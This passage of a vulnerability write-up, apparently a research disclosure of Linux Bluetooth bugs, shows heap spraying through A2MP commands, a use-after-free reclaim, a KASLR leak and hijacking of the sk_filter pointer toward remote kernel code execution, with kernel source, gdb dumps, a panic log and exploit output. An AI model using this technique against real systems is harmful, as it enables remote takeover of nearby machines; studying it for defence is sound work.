		<span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">err</span> <span class="o">=</span> <span class="n">BPF_CGROUP_RUN_PROG_INET_INGRESS</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span> <span class="n">skb</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">err</span><span class="p">;</span>

	<span class="n">err</span> <span class="o">=</span> <span class="n">security_sock_rcv_skb</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span> <span class="n">skb</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">err</span><span class="p">)</span>
		<span class="k">return</span> <span class="n">err</span><span class="p">;</span>

	<span class="n">rcu_read_lock</span><span class="p">();</span>
	<span class="n">filter</span> <span class="o">=</span> <span class="n">rcu_dereference</span><span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_filter</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">filter</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">save_sk</span> <span class="o">=</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">sk</span><span class="p">;</span>
		<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">pkt_len</span><span class="p">;</span>

		<span class="n">skb</span><span class="o">-&gt;</span><span class="n">sk</span> <span class="o">=</span> <span class="n">sk</span><span class="p">;</span>
		<span class="n">pkt_len</span> <span class="o">=</span> <span class="n">bpf_prog_run_save_cb</span><span class="p">(</span><span class="n">filter</span><span class="o">-&gt;</span><span class="n">prog</span><span class="p">,</span> <span class="n">skb</span><span class="p">);</span>
		<span class="n">skb</span><span class="o">-&gt;</span><span class="n">sk</span> <span class="o">=</span> <span class="n">save_sk</span><span class="p">;</span>
		<span class="n">err</span> <span class="o">=</span> <span class="n">pkt_len</span> <span class="o">?</span> <span class="n">pskb_trim</span><span class="p">(</span><span class="n">skb</span><span class="p">,</span> <span class="n">max</span><span class="p">(</span><span class="n">cap</span><span class="p">,</span> <span class="n">pkt_len</span><span class="p">))</span> <span class="o">:</span> <span class="o">-</span><span class="n">EPERM</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="n">rcu_read_unlock</span><span class="p">();</span>

	<span class="k">return</span> <span class="n">err</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The first usage of <code class="language-plaintext highlighter-rouge">sk</code> is in <code class="language-plaintext highlighter-rouge">sock_flag()</code>, though that function simply checks for some flags and moreover, only occurs if <code class="language-plaintext highlighter-rouge">skb_pfmemalloc()</code> returns true. Instead, let’s take a look at <code class="language-plaintext highlighter-rouge">BPF_CGROUP_RUN_PROG_INET_INGRESS()</code> and see what it does with the socket structure:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/bpf-cgroup.h</span>
<span class="cp">#define BPF_CGROUP_RUN_PROG_INET_INGRESS(sk, skb)			      \
({									      \
	int __ret = 0;							      \
	if (cgroup_bpf_enabled)						      \
		__ret = __cgroup_bpf_run_filter_skb(sk, skb,		      \
						    BPF_CGROUP_INET_INGRESS); \
									      \
	__ret;								      \
})
</span><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/bpf/cgroup.c</span>
<span class="kt">int</span> <span class="nf">__cgroup_bpf_run_filter_skb</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock</span> <span class="o">*</span><span class="n">sk</span><span class="p">,</span>
				<span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span>
				<span class="k">enum</span> <span class="n">bpf_attach_type</span> <span class="n">type</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">...</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sk</span> <span class="o">||</span> <span class="o">!</span><span class="n">sk_fullsock</span><span class="p">(</span><span class="n">sk</span><span class="p">))</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_family</span> <span class="o">!=</span> <span class="n">AF_INET</span> <span class="o">&amp;&amp;</span> <span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_family</span> <span class="o">!=</span> <span class="n">AF_INET6</span><span class="p">)</span>
		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Similarly, <code class="language-plaintext highlighter-rouge">sk_fullsock()</code> also checks for some flags and does not do anything interesting. Going further, note that <code class="language-plaintext highlighter-rouge">sk-&gt;sk_family</code> must be either <code class="language-plaintext highlighter-rouge">AF_INET=2</code> or <code class="language-plaintext highlighter-rouge">AF_INET6=10</code> in order to continue. This field is located at offset 0x10 in <code class="language-plaintext highlighter-rouge">struct sock</code>:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// pahole -E -C sock --hex bluetooth.ko</span>
<span class="k">struct</span> <span class="n">sock</span> <span class="p">{</span>
	<span class="k">struct</span> <span class="n">sock_common</span> <span class="p">{</span>
		<span class="p">...</span>
		<span class="kt">short</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">skc_family</span><span class="p">;</span>                                           <span class="cm">/*  0x10   0x2 */</span>
		<span class="p">...</span>
	<span class="p">}</span> <span class="n">__sk_common</span><span class="p">;</span> <span class="cm">/*     0  0x88 */</span>
	<span class="p">...</span>
	<span class="k">struct</span> <span class="n">sk_filter</span> <span class="o">*</span>         <span class="n">sk_filter</span><span class="p">;</span>                                            <span class="cm">/* 0x110   0x8 */</span>
	<span class="p">...</span>
	<span class="cm">/* size: 760, cachelines: 12, members: 88 */</span>
	<span class="cm">/* sum members: 747, holes: 4, sum holes: 8 */</span>
	<span class="cm">/* sum bitfield members: 40 bits (5 bytes) */</span>
	<span class="cm">/* paddings: 1, sum paddings: 4 */</span>
	<span class="cm">/* forced alignments: 1 */</span>
	<span class="cm">/* last cacheline: 56 bytes */</span>
<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">__aligned__</span><span class="p">(</span><span class="mi">8</span><span class="p">)));</span>
</code></pre></div></div>

<p>Looking at offset 0x10 in <code class="language-plaintext highlighter-rouge">struct amp_mgr</code>, we realize that this field maps to the <code class="language-plaintext highlighter-rouge">struct l2cap_conn</code> pointer:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// pahole -E -C amp_mgr --hex bluetooth.ko</span>
<span class="k">struct</span> <span class="n">amp_mgr</span> <span class="p">{</span>
	<span class="p">...</span>
	<span class="k">struct</span> <span class="n">l2cap_conn</span> <span class="o">*</span>        <span class="n">l2cap_conn</span><span class="p">;</span>                                           <span class="cm">/*  0x10   0x8 */</span>
	<span class="p">...</span>
	<span class="cm">/* size: 112, cachelines: 2, members: 11 */</span>
	<span class="cm">/* sum members: 110, holes: 1, sum holes: 2 */</span>
	<span class="cm">/* last cacheline: 48 bytes */</span>
<span class="p">};</span>
</code></pre></div></div>

<p>As this is a pointer to a heap object which is aligned to the allocation size (minimum 32 bytes), it means that the lower bytes of this pointer cannot have the values 2 or 10 as required by <code class="language-plaintext highlighter-rouge">__cgroup_bpf_run_filter_skb()</code>. Having established that, we know that the subroutine always returns 0 no matter what values the other fields have. Similarly, the subroutine <code class="language-plaintext highlighter-rouge">security_sock_rcv_skb()</code> requires the same condition and returns 0 otherwise.</p>

<p>This leaves us with <code class="language-plaintext highlighter-rouge">sk-&gt;sk_filter</code> as the only potential member to corrupt. We will later see how it may be useful to have control over <code class="language-plaintext highlighter-rouge">struct sk_filter</code>, but first, note that <code class="language-plaintext highlighter-rouge">sk_filter</code> is located at offset 0x110, whereas the size of <code class="language-plaintext highlighter-rouge">struct amp_mgr</code> is only 112=0x70 bytes wide. Is it not out of our control then? Yes and no – usually it is not in our control, however if we have a way to shape the heap, then it may be even easier to take full control over the pointer. To elaborate, the <code class="language-plaintext highlighter-rouge">struct amp_mgr</code> has a size of 112 bytes (between 65 and 128), thus it is allocated within the kmalloc-128 slab. Usually, memory blocks in the slab do not contain metadata such as chunk headers in front, as the goal is to minimize fragmentation. As such, memory blocks are consecutive and therefore, in order to control the pointer at offset 0x110, we must achieve a heap constellation where our desired pointer is located at offset 0x10 of the second block after <code class="language-plaintext highlighter-rouge">struct amp_mgr</code>.</p>

<h3 id="finding-a-heap-primitive">Finding a Heap Primitive<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#finding-a-heap-primitive" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3>

<p>In order to shape the kmalloc-128 slab, we need a command that can allocate (preferably controllable) memory with a size between 65-128 bytes. Unlike other L2CAP implementations, the usage of the heap in the Linux implementation is quite low. A quick search for <code class="language-plaintext highlighter-rouge">kmalloc()</code> or <code class="language-plaintext highlighter-rouge">kzalloc()</code> in <code class="language-plaintext highlighter-rouge">net/bluetooth/</code> yields nothing useful – or at least nothing that can be controlled or exist across multiple commands. What we would like to have is a primitive that can allocate memory of arbitrary size, copy attacker-controlled data into it, and leave it around until we decide to free it.</p>

<p>This sounds pretty much like <code class="language-plaintext highlighter-rouge">kmemdup()</code>, right? Surprisingly, the A2MP protocol offers us exactly such a primitive. Namely, we can issue a <code class="language-plaintext highlighter-rouge">A2MP_GETAMPASSOC_RSP</code> command to duplicate memory using <code class="language-plaintext highlighter-rouge">kmemdup()</code> and store the memory address within a control structure:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">a2mp_getampassoc_rsp</span><span class="p">(</span><span class="k">struct</span> <span class="n">amp_mgr</span> <span class="o">*</span><span class="n">mgr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span>
				<span class="k">struct</span> <span class="n">a2mp_cmd</span> <span class="o">*</span><span class="n">hdr</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">...</span>
	<span class="n">u16</span> <span class="n">len</span> <span class="o">=</span> <span class="n">le16_to_cpu</span><span class="p">(</span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">);</span>
	<span class="p">...</span>
	<span class="n">assoc_len</span> <span class="o">=</span> <span class="n">len</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">rsp</span><span class="p">);</span>
	<span class="p">...</span>
	<span class="n">ctrl</span> <span class="o">=</span> <span class="n">amp_ctrl_lookup</span><span class="p">(</span><span class="n">mgr</span><span class="p">,</span> <span class="n">rsp</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">ctrl</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">u8</span> <span class="o">*</span><span class="n">assoc</span><span class="p">;</span>

		<span class="n">assoc</span> <span class="o">=</span> <span class="n">kmemdup</span><span class="p">(</span><span class="n">rsp</span><span class="o">-&gt;</span><span class="n">amp_assoc</span><span class="p">,</span> <span class="n">assoc_len</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">assoc</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">amp_ctrl_put</span><span class="p">(</span><span class="n">ctrl</span><span class="p">);</span>
			<span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
		<span class="p">}</span>

		<span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">assoc</span> <span class="o">=</span> <span class="n">assoc</span><span class="p">;</span>
		<span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">assoc_len</span> <span class="o">=</span> <span class="n">assoc_len</span><span class="p">;</span>
		<span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">assoc_rem_len</span> <span class="o">=</span> <span class="n">assoc_len</span><span class="p">;</span>
		<span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">assoc_len_so_far</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

		<span class="n">amp_ctrl_put</span><span class="p">(</span><span class="n">ctrl</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>In order for <code class="language-plaintext highlighter-rouge">amp_ctrl_lookup()</code> to return a control structure, we must first add it into the list using the <code class="language-plaintext highlighter-rouge">A2MP_GETINFO_RSP</code> command:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">a2mp_getinfo_rsp</span><span class="p">(</span><span class="k">struct</span> <span class="n">amp_mgr</span> <span class="o">*</span><span class="n">mgr</span><span class="p">,</span> <span class="k">struct</span> <span class="n">sk_buff</span> <span class="o">*</span><span class="n">skb</span><span class="p">,</span>
			    <span class="k">struct</span> <span class="n">a2mp_cmd</span> <span class="o">*</span><span class="n">hdr</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">struct</span> <span class="n">a2mp_info_rsp</span> <span class="o">*</span><span class="n">rsp</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">a2mp_info_rsp</span> <span class="o">*</span><span class="p">)</span> <span class="n">skb</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">;</span>
	<span class="p">...</span>
	<span class="n">ctrl</span> <span class="o">=</span> <span class="n">amp_ctrl_add</span><span class="p">(</span><span class="n">mgr</span><span class="p">,</span> <span class="n">rsp</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">);</span>
	<span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This is almost the perfect heap primitive, since the size and content can be arbitrary! The only downside is that there is no convenient primitive which allows us to free the allocations. It seems like the only way to free them is to close the HCI connection, which is a relatively slow operation. Yet, to understand how we may free allocations in a controlled way (e.g. free every second allocation to create holes), we need to pay close attention to the memory management. Note that when we store a new memory address at <code class="language-plaintext highlighter-rouge">ctrl-&gt;assoc</code>, we do not free the memory block previously stored there. Rather, that memory block will simply be forgotten when we override it. To make use of this behavior, we can override every second <code class="language-plaintext highlighter-rouge">ctrl-&gt;assoc</code> with an allocation of a different size, and once we close the HCI connection, the other half will be freed while the ones we overrode remain allocated.</p>

<h3 id="controlling-the-out-of-bounds-read">Controlling the Out-Of-Bounds Read<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#controlling-the-out-of-bounds-read" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3>

<p>So why did we want to have a heap primitive? Recall that the idea is to shape the heap and achieve a constellation where a memory block controlled by us is located one block away from the <code class="language-plaintext highlighter-rouge">struct amp_mgr</code> object. By doing so, we can control the value at offset 0x110 which represents the <code class="language-plaintext highlighter-rouge">sk_filter</code> pointer. As a result, when we trigger the type confusion, we can dereference an arbitrary pointer.</p>

<p>The following basic technique works quite reliably on Ubuntu which uses the SLUB allocator:</p>

<ol>
  <li>Allocate a lot of objects with size of 128 bytes to fill the kmalloc-128 slabs.</li>
  <li>Create a new A2MP channel and hope that the <code class="language-plaintext highlighter-rouge">struct amp_mgr</code> object is adjacent to sprayed objects.</li>
  <li>Trigger the type confusion and achieve a controlled out-of-bounds read.</li>
</ol>

<p>To verify that our heap spray was successful, we can first query <code class="language-plaintext highlighter-rouge">/proc/slabinfo</code> for information about kmalloc-128 on the victim’s machine:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo cat</span> /proc/slabinfo
slabinfo - version: 2.1
<span class="c"># name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;</span>
...
kmalloc-128         1440   1440    128   32    1 : tunables    0    0    0 : slabdata     45     45      0
...
</code></pre></div></div>

<p>Then, after the heap spray, we can query once again and find that <code class="language-plaintext highlighter-rouge">active_objs</code> increased:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo cat</span> /proc/slabinfo
...
kmalloc-128         1760   1760    128   32    1 : tunables    0    0    0 : slabdata     55     55      0
...
</code></pre></div></div>

<p>In the example above, we sprayed 320 objects. Now, if we manage to allocate the <code class="language-plaintext highlighter-rouge">struct amp_mgr</code> object in the surrounding of these newly sprayed objects, we may hit a panic trying to dereference a controlled pointer (observe the value of RAX):</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[   58.881623] general protection fault: 0000 [#1] SMP PTI
[   58.881639] CPU: 3 PID: 568 Comm: kworker/u9:1 Not tainted 5.4.0-48-generic #52-Ubuntu
[   58.881645] Hardware name: Acer Aspire E5-575/Ironman_SK  , BIOS V1.04 04/26/2016
[   58.881705] Workqueue: hci0 hci_rx_work [bluetooth]
[   58.881725] RIP: 0010:sk_filter_trim_cap+0x65/0x220
[   58.881734] Code: 00 00 4c 89 e6 48 89 df e8 b8 c5 af ff 41 89 c5 85 c0 75 62 48 8b 83 10 01 00 00 48 85 c0 74 56 49 8b 4c 24 18 49 89 5c 24 18 &lt;4c&gt; 8b 78 18 48 89 4d b0 41 f6 47 02 08 0f 85 41 01 00 00 0f 1f 44
[   58.881740] RSP: 0018:ffffbbccc10d3ca0 EFLAGS: 00010202
[   58.881748] RAX: 4343434343434343 RBX: ffff96da38f70300 RCX: 0000000000000000
[   58.881753] RDX: 0000000000000000 RSI: ffff96da62388300 RDI: ffff96da38f70300
[   58.881758] RBP: ffffbbccc10d3d00 R08: ffff96da38f67700 R09: ffff96da68003340
[   58.881763] R10: 00000000000301c0 R11: 8075f638da96ffff R12: ffff96da62388300
[   58.881767] R13: 0000000000000000 R14: 0000000000000001 R15: 0000000000000008
[   58.881774] FS:  0000000000000000(0000) GS:ffff96da69380000(0000) knlGS:0000000000000000
[   58.881780] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   58.881785] CR2: 000055f861e4bd20 CR3: 000000024c80a001 CR4: 00000000003606e0
[   58.881790] Call Trace:
[   58.881869]  ? __l2cap_chan_add+0x88/0x1c0 [bluetooth]
[   58.881938]  l2cap_data_rcv+0x351/0x510 [bluetooth]
[   58.881995]  l2cap_data_channel+0x29f/0x470 [bluetooth]
[   58.882054]  l2cap_recv_frame+0xe5/0x300 [bluetooth]
[   58.882067]  ? __switch_to_asm+0x40/0x70
[   58.882124]  l2cap_recv_acldata+0x2d2/0x2e0 [bluetooth]
[   58.882174]  hci_rx_work+0x186/0x360 [bluetooth]
[   58.882187]  process_one_work+0x1eb/0x3b0
[   58.882197]  worker_thread+0x4d/0x400
[   58.882207]  kthread+0x104/0x140
[   58.882215]  ? process_one_work+0x3b0/0x3b0
[   58.882223]  ? kthread_park+0x90/0x90
[   58.882233]  ret_from_fork+0x35/0x40
</code></pre></div></div>

<p>Inspecting the memory address at RDI of the victim’s machine, we can see:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>gdb /boot/vmlinuz /proc/kcore
<span class="o">(</span>gdb<span class="o">)</span> x/40gx 0xffff96da38f70300
0xffff96da38f70300:	0xffff96da601e7d00	0xffffffffc0d38760
0xffff96da38f70310:	0xffff96da60de2600	0xffff96da61c13400
0xffff96da38f70320:	0x0000000000000000	0x0000000000000001
0xffff96da38f70330:	0x0000000000000000	0x0000000000000000
0xffff96da38f70340:	0xffff96da38f70340	0xffff96da38f70340
0xffff96da38f70350:	0x0000000000000000	0x0000000000000000
0xffff96da38f70360:	0xffff96da38f70360	0xffff96da38f70360
0xffff96da38f70370:	0x0000000000000000	0x0000000000000000
0xffff96da38f70380:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f70390:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703a0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703b0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703c0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703d0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703e0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f703f0:	0xffffffffffffffff	0xffffffffffffffff
0xffff96da38f70400:	0x4141414141414141	0x4242424242424242
0xffff96da38f70410:	0x4343434343434343	0x4444444444444444
0xffff96da38f70420:	0x4545454545454545	0x4646464646464646
0xffff96da38f70430:	0x4747474747474747	0x4848484848484848
</code></pre></div></div>

<p>The value at <code class="language-plaintext highlighter-rouge">0xffff96da38f70410</code> shows that <code class="language-plaintext highlighter-rouge">sk_filter()</code> indeed tried to dereference the pointer at offset 0x10 of our spray, which, from the perspective of <code class="language-plaintext highlighter-rouge">struct amp_mgr</code>, is at offset 0x110. Bingo!</p>

<h3 id="leaking-the-memory-layout">Leaking the Memory Layout<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#leaking-the-memory-layout" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3>

<p>Now we have a way to shape the heap and prepare it for the <em>BadKarma</em> attack, and as such, have full control over the <code class="language-plaintext highlighter-rouge">sk_filter</code> pointer. The question is, where shall we point it to? In order to make that primitive useful, we must point it to a memory address whose content we can control. That is where the <em>BadChoice</em> vulnerability comes into play. This vulnerability has the potential to disclose the memory layout and aid us in achieving the goal of controlling a memory block whose address we also know.</p>

<p>As mentioned earlier, in order to exploit uninitialized stack variable bugs, we must first send some different commands to populate the stack frame with interesting data (such as pointers to the heap or to .text segments relevant for ROP chains). Then, we can send the vulnerable command to receive that data.</p>

<p>By trying some random L2CAP commands, we can observe that by triggering BadChoice without any special command beforehand, a .text segment pointer to the kernel image can be leaked. Furthermore, by sending a <code class="language-plaintext highlighter-rouge">L2CAP_CONF_RSP</code> and trying to reconfigure the A2MP channel to <code class="language-plaintext highlighter-rouge">L2CAP_MODE_ERTM</code> beforehand, the address of a <code class="language-plaintext highlighter-rouge">struct l2cap_chan</code> object at offset 0x110 can be leaked. This object has a size of 792 bytes and is allocated within the kmalloc-1024 slab.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// pahole -E -C l2cap_chan --hex bluetooth.ko</span>
<span class="k">struct</span> <span class="n">l2cap_chan</span> <span class="p">{</span>
	<span class="p">...</span>
	<span class="k">struct</span> <span class="n">delayed_work</span> <span class="p">{</span>
		<span class="k">struct</span> <span class="n">work_struct</span> <span class="p">{</span>
			<span class="cm">/* typedef atomic_long_t -&gt; atomic64_t */</span> <span class="k">struct</span> <span class="p">{</span>
				<span class="cm">/* typedef s64 -&gt; __s64 */</span> <span class="kt">long</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">counter</span><span class="p">;</span>        <span class="cm">/* 0x110   0x8 */</span>
			<span class="p">}</span> <span class="n">data</span><span class="p">;</span> <span class="cm">/* 0x110   0x8 */</span>
			<span class="p">...</span>
		<span class="p">}</span> <span class="n">work</span><span class="p">;</span> <span class="cm">/* 0x110  0x20 */</span>
		<span class="p">...</span>
	<span class="p">}</span> <span class="n">chan_timer</span><span class="p">;</span> <span class="cm">/* 0x110  0x58 */</span>
	<span class="p">...</span>
	<span class="cm">/* size: 792, cachelines: 13, members: 87 */</span>
	<span class="cm">/* sum members: 774, holes: 9, sum holes: 18 */</span>
	<span class="cm">/* paddings: 4, sum paddings: 16 */</span>
	<span class="cm">/* last cacheline: 24 bytes */</span>
<span class="p">};</span>
</code></pre></div></div>

<p>It turns out that this object belongs to the A2MP channel and it can be deallocated by destroying the channel. This is useful because it allows us to apply the same strategy as for Use-After-Free attacks.</p>

<p>Consider the following technique:</p>

<ol>
  <li>Leak the address of the <code class="language-plaintext highlighter-rouge">struct l2cap_chan</code> object.</li>
  <li>Free the <code class="language-plaintext highlighter-rouge">struct l2cap_chan</code> object by destroying the A2MP channel.</li>
  <li>Reconnect the A2MP channel and spray the kmalloc-1024 slab with the heap primitive.</li>
  <li>Possibly, it will reclaim the address of the former <code class="language-plaintext highlighter-rouge">struct l2cap_chan</code> object.</li>
</ol>

<p>In other words, the address that belonged to <code class="language-plaintext highlighter-rouge">struct l2cap_chan</code> may now belong to us! Again, the used technique is very basic but works quite reliably on Ubuntu with the SLUB allocator. A concern is that when reconnecting the A2MP channel, the former <code class="language-plaintext highlighter-rouge">struct l2cap_chan</code> may be reoccupied by the new <code class="language-plaintext highlighter-rouge">struct l2cap_chan</code> before the heap spray can reclaim the location. If that is the case, multiple connections can be used to have the ability to continue spraying even if the other connection has been shut down.</p>

<p>Note that allocating objects in the kmalloc-1024 slab is a bit more complicated than the kmalloc-128 slab, because:</p>

<ul>
  <li>The ACL MTU is usually smaller than 1024 bytes (can be checked with <code class="language-plaintext highlighter-rouge">hciconfig</code>).</li>
  <li>The default MTU for the A2MP channel is <code class="language-plaintext highlighter-rouge">L2CAP_A2MP_DEFAULT_MTU=670</code> bytes.</li>
</ul>

<p>Both MTU limitations are easy to bypass. Namely, we can bypass the ACL MTU by fragmenting the request into multiple L2CAP packets, and we can bypass the A2MP MTU by sending a <code class="language-plaintext highlighter-rouge">L2CAP_CONF_MTU</code> response and configuring it to 0xffff bytes. Here again, it is unclear why the Bluetooth specification does not explicitly disallow parsing configuration responses if no request has been sent.</p>

<p>Let’s try out the technique:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc <span class="nt">-o</span> exploit exploit.c <span class="nt">-lbluetooth</span> <span class="o">&amp;&amp;</span> <span class="nb">sudo</span> ./exploit XX:XX:XX:XX:XX:XX
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening hci device...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting to victim...
<span class="o">[</span>+] HCI handle: 100
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting A2MP channel...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leaking A2MP kernel stack memory...
<span class="o">[</span>+] Kernel address: ffffffffad2001a4
<span class="o">[</span>+] KASLR offset: 2b600000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Preparing to leak l2cap_chan address...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Leaking A2MP kernel stack memory...
<span class="o">[</span>+] l2cap_chan address: ffff98ee5c62fc00
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Spraying kmalloc-1024...
</code></pre></div></div>

<p>Notice how the most significant bytes of both leaked pointers differ. By observing the higher bytes, we can make an educated guess (or check the Linux documentation) to determine whether they belong to a segment, heap, or stack. To confirm that we were indeed able to reclaim the address of <code class="language-plaintext highlighter-rouge">struct l2cap_chan</code>, we can inspect the memory on the victim’s machine using:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>gdb /boot/vmlinuz /proc/kcore
<span class="o">(</span>gdb<span class="o">)</span> x/40gx 0xffff98ee5c62fc00
0xffff98ee5c62fc00:	0x4141414141414141	0x4242424242424242
0xffff98ee5c62fc10:	0x4343434343434343	0x4444444444444444
0xffff98ee5c62fc20:	0x4545454545454545	0x4646464646464646
0xffff98ee5c62fc30:	0x4747474747474747	0x4848484848484848
...
0xffff98ee5c62fd00:	0x6161616161616161	0x6262626262626262
0xffff98ee5c62fd10:	0x6363636363636363	0x6464646464646464
0xffff98ee5c62fd20:	0x6565656565656565	0x6666666666666666
0xffff98ee5c62fd30:	0x6767676767676767	0x6868686868686868
</code></pre></div></div>

<p>The memory content looks very promising! Note that it is useful to spray with a pattern, since that allows us to recognize memory blocks immediately and understand which offsets get dereferenced when a panic is hit.</p>

<h3 id="plugging-it-all-together">Plugging It All Together<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#plugging-it-all-together" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3>

<p>We now have all primitives we need to complete our RCE:</p>

<ol>
  <li>We can control a memory block whose address we know (referred to as the “payload”).</li>
  <li>We can leak a .text segment pointer and build a ROP chain which we can store in the payload.</li>
  <li>We can take full control over the <code class="language-plaintext highlighter-rouge">sk_filter</code> field and point it to our payload.</li>
</ol>

<h4 id="achieving-rip-control">Achieving RIP Control<a class="anchorjs-link " href="https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup#achieving-rip-control" aria-label="Anchor" data-anchorjs-icon="" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h4>

<p>Let’s take a look back at <code class="language-plaintext highlighter-rouge">sk_filter_trim_cap()</code>, and understand why having control over <code class="language-plaintext highlighter-rouge">sk_filter</code> is beneficial.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/filter.c</span>
